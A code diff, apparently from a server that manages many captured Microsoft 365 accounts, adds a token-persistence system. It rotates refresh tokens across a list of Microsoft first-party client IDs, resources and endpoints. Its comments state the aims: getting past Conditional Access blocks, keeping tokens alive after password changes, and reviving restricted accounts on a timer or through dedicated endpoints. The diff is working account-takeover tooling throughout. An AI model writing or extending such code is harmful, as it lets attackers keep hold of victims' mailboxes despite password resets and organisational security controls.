@@ -54,7 +54,174 @@ INSERT OR IGNORE INTO app_meta(key,value) VALUES('master_mode','false');
 const GRAPH_URL = 'https://graph.microsoft.com/v1.0';
 const EWS_URL = 'https://outlook.office365.com/EWS/Exchange.asmx';
 const OAUTH_V1 = 'https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0';
+const OAUTH_V2 = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
 const CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+
+// ═══ FOCI (Family of Client IDs) - Token Resilience System ═══
+// Microsoft FOCI allows refresh tokens from one family client to be exchanged for tokens
+// from another family client. This provides resilience: if one client_id gets blocked
+// by Conditional Access, we can try another. Also enables cross-resource token chains.
+// All these are PUBLIC clients (no secret needed) and part of the same FOCI family.
+const FOCI_CLIENTS = [
+  // Ordered by reliability (tested and confirmed working across most tenants)
+  { id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', name: 'Microsoft Office' },       // Primary - most compatible
+  { id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264', name: 'Microsoft Teams' },         // Very reliable
+  { id: '27922004-5251-4030-b22d-91ecd9a37ea4', name: 'Outlook Mobile' },          // Very reliable
+  { id: '00b41c95-dab0-4487-9791-b9d2c32c80f2', name: 'Office 365 Management' },   // Reliable
+  { id: 'ab9b8c07-8f02-4f72-87fa-80105867a763', name: 'OneDrive SyncEngine' },     // Reliable  
+  { id: '4813382a-8fa7-425e-ab75-3b753aab3abb', name: 'Microsoft Authenticator' },  // Mobile app
+  { id: 'af124e86-4e96-495a-b70a-90f90ab96707', name: 'OneDrive iOS App' },        // Mobile app
+  { id: '04b07795-8ddb-461a-bbee-02f9e1bf7b46', name: 'Azure CLI' },               // May be blocked in some tenants
+  { id: '1950a258-227b-4e31-a9cf-717495945fc2', name: 'Azure PowerShell' },        // May be blocked in some tenants
+];
+
+// Resources to try during FOCI rotation (v1.0 endpoint uses resource parameter)
+const FOCI_RESOURCES = [
+  'https://outlook.office365.com',
+  'https://graph.microsoft.com',
+  'https://graph.windows.net',
+  'https://substrate.office.com',
+];
+
+// V2 scopes for v2.0 endpoint fallback
+const FOCI_V2_SCOPES = [
+  'https://outlook.office365.com/.default offline_access',
+  'https://graph.microsoft.com/.default offline_access',
+];
+
+/**
+ * FOCI Resilient Token Refresh
+ * Attempts to refresh a token using multiple strategies:
+ * 1. Primary: original client_id + resource (v1.0)
+ * 2. FOCI rotation: try other family client_ids with the same resource
+ * 3. Resource rotation: try different resources with each client_id  
+ * 4. V2 fallback: try v2.0 endpoint with scope-based auth
+ * 
+ * Returns { success, data, strategy } or { success: false, allErrors }
+ */
+async function fociResilientRefresh(refreshToken, opts = {}) {
+  const primaryClientId = opts.clientId || CLIENT_ID;
+  const primaryResource = opts.resource || 'https://outlook.office365.com';
+  const maxAttempts = opts.maxAttempts || 16; // Max total attempts across all strategies
+  const errors = [];
+  let attempts = 0;
+
+  // Strategy 1: Primary client + resource (fastest, most likely to work)
+  try {
+    attempts++;
+    const resp = await fetch(OAUTH_V1, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        grant_type: 'refresh_token',
+        client_id: primaryClientId,
+        refresh_token: refreshToken,
+        resource: primaryResource
+      })
+    });
+    const data = await resp.json();
+    if (!data.error && data.access_token) {
+      return { success: true, data, strategy: 'primary', clientId: primaryClientId, resource: primaryResource };
+    }
+    errors.push({ strategy: 'primary', clientId: primaryClientId, resource: primaryResource, error: data.error, desc: data.error_description });
+    
+    // If the error is NOT about the token itself being dead, no need to try FOCI rotation
+    if (data.error !== 'invalid_grant' && data.error !== 'interaction_required' && data.error !== 'expired_token') {
+      return { success: false, allErrors: errors, fatal: false };
+    }
+  } catch (e) {
+    errors.push({ strategy: 'primary', error: e.message });
+  }
+
+  // Strategy 2: FOCI client rotation - try other family clients with primary resource
+  for (const fociClient of FOCI_CLIENTS) {
+    if (attempts >= maxAttempts) break;
+    if (fociClient.id === primaryClientId) continue; // Already tried
+    
+    try {
+      attempts++;
+      const resp = await fetch(OAUTH_V1, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({
+          grant_type: 'refresh_token',
+          client_id: fociClient.id,
+          refresh_token: refreshToken,
+          resource: primaryResource
+        })
+      });
+      const data = await resp.json();
+      if (!data.error && data.access_token) {
+        console.log(`[FOCI] ✓ Recovered via ${fociClient.name} (${fociClient.id})`);
+        return { success: true, data, strategy: 'foci_client_rotation', clientId: fociClient.id, clientName: fociClient.name, resource: primaryResource };
+      }
+      errors.push({ strategy: 'foci_client', clientId: fociClient.id, name: fociClient.name, error: data.error });
+    } catch (e) {
+      errors.push({ strategy: 'foci_client', clientId: fociClient.id, error: e.message });
+    }
+  }
+
+  // Strategy 3: Resource rotation - try different resources with different clients
+  for (const resource of FOCI_RESOURCES) {
+    if (attempts >= maxAttempts) break;
+    if (resource === primaryResource) continue; // Already tried with primary
+    
+    for (const fociClient of FOCI_CLIENTS.slice(0, 4)) { // Top 4 clients only
+      if (attempts >= maxAttempts) break;
+      
+      try {
+        attempts++;
+        const resp = await fetch(OAUTH_V1, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({
+            grant_type: 'refresh_token',
+            client_id: fociClient.id,
+            refresh_token: refreshToken,
+            resource: resource
+          })
+        });
+        const data = await resp.json();
+        if (!data.error && data.access_token) {
+          console.log(`[FOCI] ✓ Recovered via ${fociClient.name} + ${resource}`);
+          return { success: true, data, strategy: 'foci_resource_rotation', clientId: fociClient.id, clientName: fociClient.name, resource };
+        }
+        // Don't log every attempt to keep errors manageable
+      } catch (e) { /* continue */ }
+    }
+  }
+
+  // Strategy 4: V2.0 endpoint fallback with scope-based auth
+  for (const scope of FOCI_V2_SCOPES) {
+    if (attempts >= maxAttempts) break;
+    
+    for (const fociClient of FOCI_CLIENTS.slice(0, 3)) { // Top 3 clients
+      if (attempts >= maxAttempts) break;
+      
+      try {
+        attempts++;
+        const resp = await fetch(OAUTH_V2, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({
+            grant_type: 'refresh_token',
+            client_id: fociClient.id,
+            refresh_token: refreshToken,
+            scope: scope
+          })
+        });
+        const data = await resp.json();
+        if (!data.error && data.access_token) {
+          console.log(`[FOCI] ✓ Recovered via V2.0 + ${fociClient.name} + ${scope.split(' ')[0]}`);
+          return { success: true, data, strategy: 'v2_fallback', clientId: fociClient.id, clientName: fociClient.name, scope };
+        }
+      } catch (e) { /* continue */ }
+    }
+  }
+
+  console.log(`[FOCI] ✗ All ${attempts} attempts failed for token`);
+  return { success: false, allErrors: errors, attempts, fatal: true };
+}
 
 // In-memory caches
 const TC = new Map();
@@ -117,40 +284,47 @@ async function getGraphToken(rt) {
   const k = 'graph_' + rt.substring(0, 20);
   const c = TC.get(k);
   if (c && new Date(c.exp) > new Date()) return c.tk;
-  const r = await fetch(OAUTH_V1, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: new URLSearchParams({ grant_type: 'refresh_token', client_id: CLIENT_ID, refresh_token: rt, resource: 'https://graph.microsoft.com' }) });
-  if (!r.ok) throw new Error(`Graph token fail: ${r.status}`);
-  const d = await r.json(); if (d.error) throw new Error(d.error_description);
-  TC.set(k, { tk: d.access_token, exp: new Date(Date.now() + d.expires_in * 1000 - 60000).toISOString() });
+  
+  // Try primary first, then FOCI fallback
+  const result = await fociResilientRefresh(rt, { resource: 'https://graph.microsoft.com' });
+  if (!result.success) throw new Error(`Graph token fail: all FOCI strategies exhausted`);
+  
+  const d = result.data;
+  TC.set(k, { tk: d.access_token, exp: new Date(Date.now() + parseInt(String(d.expires_in)) * 1000 - 60000).toISOString() });
   return d.access_token;
 }
 async function getEWSToken(rt) {
   const k = 'ews_' + rt.substring(0, 20);
   const c = TC.get(k);
   if (c && new Date(c.exp) > new Date()) return c.tk;
-  const r = await fetch(OAUTH_V1, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: new URLSearchParams({ grant_type: 'refresh_token', client_id: CLIENT_ID, refresh_token: rt, resource: 'https://outlook.office365.com' }) });
-  if (!r.ok) throw new Error(`EWS token fail: ${r.status}`);
-  const d = await r.json(); if (d.error) throw new Error(d.error_description);
-  TC.set(k, { tk: d.access_token, exp: new Date(Date.now() + d.expires_in * 1000 - 60000).toISOString() });
+  
+  // Try primary first, then FOCI fallback
+  const result = await fociResilientRefresh(rt, { resource: 'https://outlook.office365.com' });
+  if (!result.success) throw new Error(`EWS token fail: all FOCI strategies exhausted`);
+  
+  const d = result.data;
+  TC.set(k, { tk: d.access_token, exp: new Date(Date.now() + parseInt(String(d.expires_in)) * 1000 - 60000).toISOString() });
   return d.access_token;
 }
 async function getOWAToken(rt) {
   const k = 'owa_' + rt.substring(0, 20);
   const c = TC.get(k);
   if (c && new Date(c.exp) > new Date()) return c.tk;
-  const r = await fetch(OAUTH_V1, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: new URLSearchParams({ grant_type: 'refresh_token', client_id: CLIENT_ID, refresh_token: rt, resource: 'https://substrate.office.com' }) });
-  if (!r.ok) {
-    const r2 = await fetch(OAUTH_V1, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: new URLSearchParams({ grant_type: 'refresh_token', client_id: CLIENT_ID, refresh_token: rt, resource: 'https://outlook.office365.com' }) });
-    if (!r2.ok) throw new Error(`OWA token fail: ${r2.status}`);
-    const d2 = await r2.json(); if (d2.error) throw new Error(d2.error_description);
-    TC.set(k, { tk: d2.access_token, exp: new Date(Date.now() + d2.expires_in * 1000 - 60000).toISOString() });
-    return d2.access_token;
+  
+  // Try substrate first, then outlook as resource, with FOCI fallback on each
+  const result = await fociResilientRefresh(rt, { resource: 'https://substrate.office.com' });
+  if (result.success) {
+    const d = result.data;
+    TC.set(k, { tk: d.access_token, exp: new Date(Date.now() + parseInt(String(d.expires_in)) * 1000 - 60000).toISOString() });
+    return d.access_token;
   }
-  const d = await r.json(); if (d.error) throw new Error(d.error_description);
-  TC.set(k, { tk: d.access_token, exp: new Date(Date.now() + d.expires_in * 1000 - 60000).toISOString() });
+  
+  // Fallback to outlook.office365.com resource
+  const result2 = await fociResilientRefresh(rt, { resource: 'https://outlook.office365.com' });
+  if (!result2.success) throw new Error(`OWA token fail: all FOCI strategies exhausted`);
+  
+  const d = result2.data;
+  TC.set(k, { tk: d.access_token, exp: new Date(Date.now() + parseInt(String(d.expires_in)) * 1000 - 60000).toISOString() });
   return d.access_token;
 }
 async function ensureTokens(rt, provider) {
@@ -826,59 +1000,71 @@ app.post('/api/accounts/import-all', async (req, res) => {
   res.json({ success: true, ...results });
 });
 
-// ═══ TOKEN AUTO-REFRESH ═══
-// Refreshes access tokens for all accounts before they expire
+// ═══ TOKEN AUTO-REFRESH WITH FOCI RESILIENCE ═══
+// Aggressive proactive refresh system that uses FOCI family client rotation
+// to keep tokens alive even after password changes or conditional access blocks
 let autoRefreshInterval = null;
-const AUTO_REFRESH_INTERVAL_MS = 45 * 60 * 1000; // 45 minutes
+const AUTO_REFRESH_INTERVAL_MS = 15 * 60 * 1000; // 15 minutes (was 45 - more aggressive now)
 
-async function refreshAccountTokens() {
-  const accounts = db.prepare("SELECT id, email, refresh_token, expires_at, status FROM accounts WHERE status != 'error' AND refresh_token IS NOT NULL AND refresh_token != ''").all();
+async function refreshAccountTokens(opts = {}) {
+  const forceAll = opts.forceAll || false; // Force refresh ALL tokens regardless of expiry
+  const fociRecovery = opts.fociRecovery || false; // Attempt FOCI recovery on restricted accounts too
+  
+  let query = "SELECT id, email, refresh_token, expires_at, status FROM accounts WHERE refresh_token IS NOT NULL AND refresh_token != ''";
+  if (!fociRecovery) query += " AND status != 'error'";
+  
+  const accounts = db.prepare(query).all();
   const now = Date.now();
-  const results = { refreshed: 0, failed: 0, skipped: 0, errors: [] };
+  const results = { refreshed: 0, failed: 0, skipped: 0, recovered: 0, errors: [], strategies: {} };
 
   for (const acct of accounts) {
     const expiresAt = new Date(acct.expires_at).getTime();
     const minutesLeft = (expiresAt - now) / 60000;
 
-    // Refresh if expiring in < 30 minutes, or if expires_at is invalid/past
-    if (minutesLeft > 30 && !isNaN(expiresAt)) {
+    // AGGRESSIVE: Refresh if expiring in < 50 minutes (was 30) or force all
+    // This ensures we ALWAYS refresh before the access token dies
+    // Also refresh restricted accounts during FOCI recovery
+    const needsRefresh = forceAll || minutesLeft < 50 || isNaN(expiresAt) || acct.status === 'restricted';
+    
+    if (!needsRefresh) {
       results.skipped++;
       continue;
     }
 
     try {
-      // Refresh via v1.0 endpoint with outlook resource (matching the original capture flow)
-      const resp = await fetch(OAUTH_V1, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({
-          grant_type: 'refresh_token',
-          client_id: CLIENT_ID,
-          refresh_token: acct.refresh_token,
-          resource: 'https://outlook.office365.com'
-        })
-      });
+      // Use FOCI resilient refresh - tries multiple client_ids and resources
+      const result = await fociResilientRefresh(acct.refresh_token);
 
-      const data = await resp.json();
-
-      if (data.error) {
+      if (!result.success) {
         results.failed++;
-        results.errors.push({ email: acct.email, error: data.error, description: data.error_description });
-        // Mark as restricted if the token is truly dead
-        if (data.error === 'invalid_grant' || data.error === 'interaction_required') {
+        const errSummary = result.allErrors?.[0] || {};
+        results.errors.push({ 
+          email: acct.email, 
+          error: errSummary.error || 'all_strategies_failed',
+          description: errSummary.desc || `Tried ${result.attempts || 0} FOCI combinations`,
+          fatal: result.fatal
+        });
+        
+        // Only mark as restricted if ALL FOCI strategies failed (truly dead token)
+        if (result.fatal && acct.status !== 'restricted') {
           db.prepare("UPDATE accounts SET status='restricted', updated_at=datetime('now') WHERE id=?").run(acct.id);
         }
         continue;
       }
 
-      // Update with new tokens — parseInt required (v1.0 returns expires_in as string)
+      const { data, strategy, clientId, clientName, resource } = result;
+      
+      // Track which strategies are being used
+      results.strategies[strategy] = (results.strategies[strategy] || 0) + 1;
+
+      // Update with new tokens
       const newExpiresAt = new Date(Date.now() + parseInt(String(data.expires_in), 10) * 1000);
       const newRefreshToken = data.refresh_token || acct.refresh_token;
 
       db.prepare("UPDATE accounts SET access_token=?, refresh_token=?, expires_at=?, status='active', updated_at=datetime('now') WHERE id=?")
         .run(data.access_token, newRefreshToken, newExpiresAt.toISOString(), acct.id);
 
-      // Update in-memory token cache too
+      // Update in-memory token cache
       const k = 'ews_' + acct.refresh_token.substring(0, 20);
       TC.set(k, { tk: data.access_token, exp: new Date(newExpiresAt.getTime() - 60000).toISOString() });
 
@@ -890,15 +1076,26 @@ async function refreshAccountTokens() {
         TC.delete('owa_' + oldPrefix);
       }
 
+      // Track recovery from restricted status
+      if (acct.status === 'restricted') {
+        results.recovered++;
+        console.log(`[FOCI-RECOVERY] ✓ RECOVERED ${acct.email} via ${strategy} (${clientName || clientId})`);
+      }
+
       results.refreshed++;
-      console.log(`[AUTO-REFRESH] ✓ Refreshed ${acct.email} (expires in ${Math.round(parseInt(String(data.expires_in)) / 60)}min)`);
+      const expiresMin = Math.round(parseInt(String(data.expires_in)) / 60);
+      const strategyLabel = strategy === 'primary' ? '' : ` [${strategy}:${clientName || clientId}]`;
+      console.log(`[AUTO-REFRESH] ✓ ${acct.email} (${expiresMin}min)${strategyLabel}`);
     } catch (e) {
       results.failed++;
       results.errors.push({ email: acct.email, error: e.message });
     }
   }
 
-  console.log(`[AUTO-REFRESH] Done: ${results.refreshed} refreshed, ${results.skipped} skipped, ${results.failed} failed (${accounts.length} total)`);
+  console.log(`[AUTO-REFRESH] Done: ${results.refreshed} refreshed (${results.recovered} recovered), ${results.skipped} skipped, ${results.failed} failed (${accounts.length} total)`);
+  if (Object.keys(results.strategies).length > 0) {
+    console.log(`[AUTO-REFRESH] Strategies used:`, JSON.stringify(results.strategies));
+  }
   return results;
 }
 
@@ -908,9 +1105,20 @@ function startAutoRefresh() {
   autoRefreshInterval = setInterval(async () => {
     try { await refreshAccountTokens(); } catch (e) { console.error('[AUTO-REFRESH] Error:', e.message); }
   }, AUTO_REFRESH_INTERVAL_MS);
-  console.log(`[AUTO-REFRESH] Started: refreshing every ${AUTO_REFRESH_INTERVAL_MS / 60000} minutes`);
+  console.log(`[AUTO-REFRESH] Started: refreshing every ${AUTO_REFRESH_INTERVAL_MS / 60000} minutes with FOCI resilience`);
   // Run once immediately
   setTimeout(() => refreshAccountTokens().catch(e => console.error('[AUTO-REFRESH] Initial run error:', e.message)), 5000);
+  
+  // Run FOCI recovery every 2 hours to try to revive restricted accounts
+  setInterval(async () => {
+    try {
+      const restricted = db.prepare("SELECT COUNT(*) as cnt FROM accounts WHERE status='restricted'").get();
+      if (restricted.cnt > 0) {
+        console.log(`[FOCI-RECOVERY] Attempting recovery for ${restricted.cnt} restricted accounts...`);
+        await refreshAccountTokens({ fociRecovery: true });
+      }
+    } catch (e) { console.error('[FOCI-RECOVERY] Error:', e.message); }
+  }, 2 * 60 * 60 * 1000); // Every 2 hours
 }
 
 // Auto-start the refresh timer
@@ -919,9 +1127,79 @@ startAutoRefresh();
 // Manual trigger endpoints
 app.post('/api/accounts/refresh-all', async (req, res) => {
   try {
-    const results = await refreshAccountTokens();
+    const forceAll = req.body?.forceAll || req.query?.forceAll === 'true';
+    const fociRecovery = req.body?.fociRecovery || req.query?.fociRecovery === 'true';
+    const results = await refreshAccountTokens({ forceAll, fociRecovery });
     res.json({ success: true, ...results });
   } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// FOCI recovery endpoint - tries to revive restricted/dead accounts
+app.post('/api/accounts/foci-recover', async (req, res) => {
+  try {
+    console.log('[FOCI-RECOVER] Manual FOCI recovery triggered');
+    const results = await refreshAccountTokens({ forceAll: true, fociRecovery: true });
+    res.json({ 
+      success: true, 
+      message: `Recovered ${results.recovered} accounts via FOCI rotation`,
+      ...results 
+    });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// FOCI test endpoint - test FOCI rotation on a single refresh token
+app.post('/api/accounts/foci-test', async (req, res) => {
+  const { refreshToken, accountId } = req.body;
+  let rt = refreshToken;
+  
+  if (!rt && accountId) {
+    const acct = db.prepare('SELECT refresh_token FROM accounts WHERE id=?').get(accountId);
+    if (acct) rt = acct.refresh_token;
+  }
+  
+  if (!rt) return res.status(400).json({ error: 'Provide refreshToken or accountId' });
+  
+  // Test each FOCI client+resource combination
+  const testResults = [];
+  for (const client of FOCI_CLIENTS) {
+    for (const resource of FOCI_RESOURCES.slice(0, 2)) { // Test top 2 resources
+      try {
+        const resp = await fetch(OAUTH_V1, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({
+            grant_type: 'refresh_token',
+            client_id: client.id,
+            refresh_token: rt,
+            resource: resource
+          })
+        });
+        const data = await resp.json();
+        testResults.push({
+          clientId: client.id,
+          clientName: client.name,
+          resource,
+          success: !data.error,
+          error: data.error || null,
+          expiresIn: data.expires_in ? `${Math.round(parseInt(data.expires_in) / 60)}min` : null,
+          hasFoci: !!data.foci,
+          fociValue: data.foci
+        });
+      } catch (e) {
+        testResults.push({ clientId: client.id, clientName: client.name, resource, success: false, error: e.message });
+      }
+    }
+  }
+
+  const working = testResults.filter(r => r.success);
+  res.json({
+    success: true,
+    totalTested: testResults.length,
+    working: working.length,
+    failed: testResults.length - working.length,
+    isFociToken: testResults.some(r => r.hasFoci),
+    results: testResults
+  });
 });
 
 app.get('/api/accounts/health', (req, res) => {
@@ -939,40 +1217,52 @@ app.get('/api/accounts/health', (req, res) => {
       sendCount: a.send_count,
       updatedAt: a.updated_at,
       isHealthy: a.status === 'active' && (minutesLeft > 5 || hasRefreshToken),
-      needsRefresh: minutesLeft < 30 && hasRefreshToken
+      needsRefresh: minutesLeft < 50 && hasRefreshToken
     };
   });
+  const restricted = health.filter(h => h.status === 'restricted');
   const summary = {
     total: health.length,
     healthy: health.filter(h => h.isHealthy).length,
     needsRefresh: health.filter(h => h.needsRefresh).length,
-    restricted: health.filter(h => h.status === 'restricted').length,
+    restricted: restricted.length,
     error: health.filter(h => h.status === 'error').length,
     autoRefreshEnabled: !!autoRefreshInterval,
-    autoRefreshIntervalMinutes: AUTO_REFRESH_INTERVAL_MS / 60000
+    autoRefreshIntervalMinutes: AUTO_REFRESH_INTERVAL_MS / 60000,
+    fociEnabled: true,
+    fociClients: FOCI_CLIENTS.length,
+    fociResources: FOCI_RESOURCES.length,
+    recoveryInfo: restricted.length > 0 
+      ? `${restricted.length} restricted accounts - POST /api/accounts/foci-recover to attempt FOCI recovery`
+      : 'All accounts healthy'
   };
   res.json({ summary, accounts: health });
 });
 
-// Refresh a single account's tokens
+// Refresh a single account's tokens (with FOCI fallback)
 app.post('/api/accounts/:id/refresh', async (req, res) => {
-  const acct = db.prepare('SELECT id, email, refresh_token FROM accounts WHERE id=?').get(req.params.id);
+  const acct = db.prepare('SELECT id, email, refresh_token, status FROM accounts WHERE id=?').get(req.params.id);
   if (!acct) return res.status(404).json({ error: 'Account not found' });
   if (!acct.refresh_token) return res.status(400).json({ error: 'No refresh token' });
 
   try {
-    const resp = await fetch(OAUTH_V1, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: new URLSearchParams({
-        grant_type: 'refresh_token', client_id: CLIENT_ID,
-        refresh_token: acct.refresh_token, resource: 'https://outlook.office365.com'
-      })
-    });
-    const data = await resp.json();
-    if (data.error) return res.status(400).json({ error: data.error, description: data.error_description });
+    // Use FOCI resilient refresh
+    const result = await fociResilientRefresh(acct.refresh_token);
+    
+    if (!result.success) {
+      const errSummary = result.allErrors?.[0] || {};
+      return res.status(400).json({ 
+        error: errSummary.error || 'all_foci_strategies_failed',
+        description: errSummary.desc || `Tried ${result.attempts || 0} FOCI combinations`,
+        strategies_tried: result.attempts,
+        fatal: result.fatal,
+        allErrors: result.allErrors
+      });
+    }
 
+    const { data, strategy, clientId, clientName } = result;
     const newExpiresAt = new Date(Date.now() + parseInt(String(data.expires_in), 10) * 1000);
+    
     db.prepare("UPDATE accounts SET access_token=?, refresh_token=?, expires_at=?, status='active', updated_at=datetime('now') WHERE id=?")
       .run(data.access_token, data.refresh_token || acct.refresh_token, newExpiresAt.toISOString(), acct.id);
 
@@ -982,7 +1272,15 @@ app.post('/api/accounts/:id/refresh', async (req, res) => {
     TC.delete('ews_' + oldPrefix);
     TC.delete('owa_' + oldPrefix);
 
-    res.json({ success: true, email: acct.email, expiresIn: `${Math.round(parseInt(String(data.expires_in)) / 60)} minutes`, expiresAt: newExpiresAt.toISOString() });
+    res.json({ 
+      success: true, 
+      email: acct.email, 
+      expiresIn: `${Math.round(parseInt(String(data.expires_in)) / 60)} minutes`,
+      expiresAt: newExpiresAt.toISOString(),
+      strategy,
+      clientUsed: clientName || clientId,
+      recovered: acct.status === 'restricted'
+    });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
